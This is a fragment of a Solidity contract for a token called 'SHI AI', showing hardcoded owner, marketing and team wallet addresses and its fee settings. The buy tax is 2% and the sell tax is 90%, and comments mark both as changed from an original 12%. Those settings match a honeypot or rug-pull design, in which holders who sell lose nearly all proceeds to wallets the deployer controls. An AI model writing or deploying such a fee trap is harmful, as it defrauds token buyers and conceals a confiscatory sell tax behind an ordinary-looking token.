...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x4Af85619E376Fa8D283BAE4e407bae8fCb01C554; // owner address
...
contract SHIAI is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "SHI AI";
    string private _symbol = "SHI";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xf1CDf6C15715fd65Fc8B383D22Eb61F876bfb530); // Marketing Address
    address payable public teamWalletAddress = payable(0x2363DCd6614d693cEc3844EF0866685fE911A722); // Team Address
    ...
    uint256 public _sellLiquidityFee = 27;
    uint256 public _sellMarketingFee = 63;
    uint256 public _sellTeamFee = 0;

    uint256 public _liquidityShare = 30; // original 5
    uint256 public _marketingShare = 70;
    uint256 public _teamShare = 0; // original 12

    uint256 public _totalTaxIfBuying = 2;  // original 12
    uint256 public _totalTaxIfSelling = 90;  // original 12
